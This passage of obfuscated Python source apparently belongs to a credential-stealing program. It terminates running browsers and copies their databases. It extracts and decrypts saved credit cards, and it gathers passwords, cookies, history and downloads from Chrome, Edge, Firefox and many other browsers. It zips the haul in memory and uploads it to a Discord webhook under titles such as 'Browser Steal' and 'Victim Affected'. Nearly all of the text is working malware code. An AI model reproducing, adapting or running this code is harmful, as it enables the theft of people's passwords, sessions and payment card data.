        HMSSDLXAFCXSDOAAUFNACJOIHYISQYDRZKSPNRVNYTMAKWHAHLQUWSDBNSBNRYRQTBVINDKTKDRFZFKYFOESPGKHUAYTOBT = os.path.join(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, 'Web Data')
        if not os.path.exists(HMSSDLXAFCXSDOAAUFNACJOIHYISQYDRZKSPNRVNYTMAKWHAHLQUWSDBNSBNRYRQTBVINDKTKDRFZFKYFOESPGKHUAYTOBT):
            return

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(HMSSDLXAFCXSDOAAUFNACJOIHYISQYDRZKSPNRVNYTMAKWHAHLQUWSDBNSBNRYRQTBVINDKTKDRFZFKYFOESPGKHUAYTOBT)
        disk_conn.backup(YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM)
        disk_conn.close()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR = YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.cursor()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL =             f"- Name             : {v4r_row[0]}"
            LGTSWIAPGIEFVJZIXCTQGBCUIVWVZTJMLHQCUCFXWOZITNPPAUKGYQRJUTEQZSBOKRFPVSCBYAVISQGCL = f"  Expiration Month : {v4r_row[1]}"
            WHGDZPYRMNSNEWRDTYGURTLPOVDZHEZIQTHODXXUBECXALJOGSDGA =  f"  Expiration Year  : {v4r_row[2]}"
            VRFPBGRLMLMZWFPRCYUSCTAUFTWPSPNBQDEYOUMFJJIRUIRQAMZRAXO =      f"  Card Number      : {JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(v4r_row[3], DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)}"
            LHHNSSKCAVMQRGLBUXCZPRJSMJRFZGTSKEATHUQULNLEZNYLCSAFHPNTVBFWZZRXIIAIYMBAERDBWKWSYIPJ =    f"  Date Modified    : {v4r_row[4]}"
            RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name =     f"  Browser          : {RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU}"
            HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH.append(f"{MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL}\n{LGTSWIAPGIEFVJZIXCTQGBCUIVWVZTJMLHQCUCFXWOZITNPPAUKGYQRJUTEQZSBOKRFPVSCBYAVISQGCL}\n{WHGDZPYRMNSNEWRDTYGURTLPOVDZHEZIQTHODXXUBECXALJOGSDGA}\n{VRFPBGRLMLMZWFPRCYUSCTAUFTWPSPNBQDEYOUMFJJIRUIRQAMZRAXO}\n{LHHNSSKCAVMQRGLBUXCZPRJSMJRFZGTSKEATHUQULNLEZNYLCSAFHPNTVBFWZZRXIIAIYMBAERDBWKWSYIPJ}\n{RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name}\n")
        
        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.close()

    def REUENZATCZRKCQVUPIDFMCBACDFFBBXZNTGWUWELDEYGOFGSAHWFOUJKWNEEUT(DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS):
        files_in_memory = {}

        if MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP:
            files_in_memory[f"Passwords_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt"] = '\n'.join(MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP)

        if AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA:
            files_in_memory[f"Cookies_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt"] = '\n'.join(AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA)

        if SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ:
            files_in_memory[f"History_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt"] = '\n'.join(SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ)

        if XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY:
            files_in_memory[f"Downloads_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt"] = '\n'.join(XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY)

        if HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH:
            files_in_memory[f"Cards_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt"] = '\n'.join(HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def AZYMHRCRNWHGTERMFFLXBGVJBNNIDCZDVUHOQAEIANEHFWZRORHQZIGVPVXRAEHKBGYRSYODJWBGZYMUGFKCSMY(DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS, zip_in_memory):
        DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR = SyncWebhook.from_url(CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI)
        DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR.send(
            embed=Embed(
                title=f'Browser Steal {DPZEOYYVYHHCDTHYXVDIUJXMLXNPECBKTNJUHKJWBHAOJYTUMWKLLEGYQAR}:',
                description=f"Found In **{'**, **'.join(NLEIRVHIYYRIJPCHOKRSJSSLSUHRXTXWPXNWTWMSGENSACVGIOKLIFAIATDPMXNUVGTKWZBZSJE)}**: ```📂 - Browser_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.zip\n├── 📄 - Cards_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt\n├── 📄 - Cookies_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt\n├── 📄 - Downloads_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt\n├── 📄 - History_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt\n└── 📄 - Passwords_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.txt```",
                color=DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM,
            ).set_footer(
                text=AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE,
                icon_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}.zip"), 
            username=XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, avatar_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS
        )
        
    OLWPWOMHCQWHISIMPYOWZHWXAPVFFOOGBJITBEEPQBAKDMDNVSXQYZ = {
        'Google Chrome': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Amigo', 'User Data'),
        'Torch': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Torch', 'User Data'),
        'Kometa': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD, 'Apple Computer', 'Safari'),
    }

    OLWPWOMHCQWHISIMPYOWZHWXAPVFFOOGBJITBEEPQBAKDMDNVSXQYZ_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    PXLSOHDVBEJYKXEGVBYUSTYWMMBSHIZYPFLJSKMLQMRXLDNEYGGIZCSJVGGHRUFHZBZUVUGUGWKQODURVPIB = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in OLWPWOMHCQWHISIMPYOWZHWXAPVFFOOGBJITBEEPQBAKDMDNVSXQYZ_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ in OLWPWOMHCQWHISIMPYOWZHWXAPVFFOOGBJITBEEPQBAKDMDNVSXQYZ.items():
        if not os.path.exists(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
            continue

        DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD = EELMGCJPTRRITYQVTSVMBFSDIMWAQVGZFYMMXIAAEMMVORPMTSUQITYANZYCZREQVBQQWLZDCPKCLYAQKFZMGBFLDHEDEI(os.path.join(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ, 'Local State'))
        if not DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD:
            continue

        for v4r_profile in PXLSOHDVBEJYKXEGVBYUSTYWMMBSHIZYPFLJSKMLQMRXLDNEYGGIZCSJVGGHRUFHZBZUVUGUGWKQODURVPIB:
            EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB = os.path.join(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ, v4r_profile)
            if not os.path.exists(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB):
                continue
            
            try: LPJNUNMCQJKKYDCQRHASEGGOBJZCVNREMSNDAYRYCPAYSYUKIWJIYINJPQXVHPOKZXDATQUDLOCVRQJST(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)
            except: pass
            try: INCFFJNHKUGEUYHBOFZOHRNJGDFTCOULHYTMKCWZMXDXAFPRZRJCMSJYAAJPODAYOTURMXYBLXXOUKSCKIDZWUZMNTA(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)
            except: pass
            try: ZRGPEDFAYGZUIYZFGGLMUVXHXOIFRUMTQUFQYUQNHGIQMRPVPILGLOJQSIOAOPZBPJIRMPEHKMVFQUFMLRZWETAYDZENOESWVJ(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB)
            except: pass
            try: MBVEPJMCACPXWABSPMJFWZWZHGLPYIGXCZJHCIKXSCYUSGZGHGKUMIOGWABGGORNSALNJEJWTKFUHTODFJVQTFAKJWUKZRVCX(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB)
            except: pass
            try: KLMMSLNCGYQMKBTTLRLLIKHDHNAQLRUTHTZGQACKBASRVGFUSIRJAEKPIPMZMMRDICEBGTACMJMSDHSOMSKJVLMGQZHDD(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)
            except: pass

            if RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU not in NLEIRVHIYYRIJPCHOKRSJSSLSUHRXTXWPXNWTWMSGENSACVGIOKLIFAIATDPMXNUVGTKWZBZSJE:
                NLEIRVHIYYRIJPCHOKRSJSSLSUHRXTXWPXNWTWMSGENSACVGIOKLIFAIATDPMXNUVGTKWZBZSJE.append(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU)
            
    if not MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP:
        MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP.append("No passwords was saved on the victim's computer")
    if not AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA:
        AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA.append("No cookies was saved on the victim's computer")
    if not SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ:
        SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ.append("No history was saved on the victim's computer")
    if not XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY:
        XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY.append("No downloads was saved on the victim's computer")
    if not HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH:
        HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH.append("No card was saved on the victim's computer")

    zip_in_memory = REUENZATCZRKCQVUPIDFMCBACDFFBBXZNTGWUWELDEYGOFGSAHWFOUJKWNEEUT(DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS)
    AZYMHRCRNWHGTERMFFLXBGVJBNNIDCZDVUHOQAEIANEHFWZRORHQZIGVPVXRAEHKBGYRSYODJWBGZYMUGFKCSMY(DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS, zip_in_memory)

try: requests.post(CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, 'avatar_url': SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS,})
except: pass
try: threading.Thread(target=UUIHOTVTUUPMMEYKLZVVVVZZAMDPQEPPQVWMYFJUULTSAHBLQVRNSKHSPTTAODXUJREUEJTJEHXJOYLANGDRZPQNGMK).start()
except: pass
try: threading.Thread(target=UUIGEGDCNNOOQMCDPLZPLUDCZCEDZWTOLUOOAJMUQRSGWOXMQNMBS).start()
except: pass
try: threading.Thread(target=ATFZEITPXGPAUNKMHKKWOCBAFSXSBBGTCPDIALHVOKBBNLNEWOTGRKRSSNVZWLSNDCPNUYBZJIPQXERPHUUQRNZUZFAXQUYSGKCK).start()
except: pass
try: threading.Thread(target=MZRYJMGODYFASFYTGWYXFTJDZKITQCBWGPYTIBGCPWJVRAUPQQKOAIPQWOCIJMPJROSQLRK).start()
except: pass
try: DTLMUHTIYOIKEJAWJBMIVWSSMVHXMFPORFXDXHVQGGKDQSPHLIWHVIJDPYMIJLDNWYUQQOPTFUBACNQTRU()
except: pass
try: MWNVYDWEWVGZUEMUEAMFBDZWJTYIOFBABCHNAPIUZAQXVIUDZGTAZJCCGJXNDALBATHONZAINIUBUKBSIUF()
except: pass
try: NYSCXANWOFWLCMRXJQGARPRQPCZKDRJXIARGGWDVSCAQZLPYBNIF()
except: pass
try: ZCISFJWJSTPVORGIGGOQEMGAGVSCJHWWCJRCBCETACSQVPMRCYTDIAYIHNZJWLKFHTSOLIWUUUTFXPE()
except: pass
try: GACPRPWOKYEBIHYZKGWTVAGIQRTCJMAWBWEQCVLEBRAHRTZNRRVQGBJBRWDVRXOLAKWIYOKJNIKT()
except: pass
try: FLBOCAAGPGITEVJPENBLWMDKFDSJPYUYFOJCHPSPAXTVQEKYMTWRGLCZVLULTBN()
except: pass
try: LJVXCHQRUKDVHXRUCQLFAPTOSMJBFEVHYNJSEEQHHVDGOVKATZXANDZWYZX()
except: pass
try: IBIYMTIDBWLOWPTLUCRLVHUKRCNDJWEYDHSKJHCAZZGYAWXSTU()
except: pass
try: requests.post(CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI, json={'content': f'****╚══════════════════{CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR}══════════════════╝****', 'username': XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, 'avatar_url': SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS})
except: pass
try: threading.Thread(target=EZFTTOZOSSBMZLECOOYBHTEMXGTZJEYWIEWFCSYTJDFTNAWOKHIPMGKIBPYTZLVRAIJZHQQKVJZNBKETADHCKSILZFOYKXFHXBYE).start()
except: pass
try: threading.Thread(target=XIURVILXTSPZLDHWUFIBDNFBIVZFPSMAIFDSYDPDLUQAQPBVMKVUVKZL).start()
except: pass
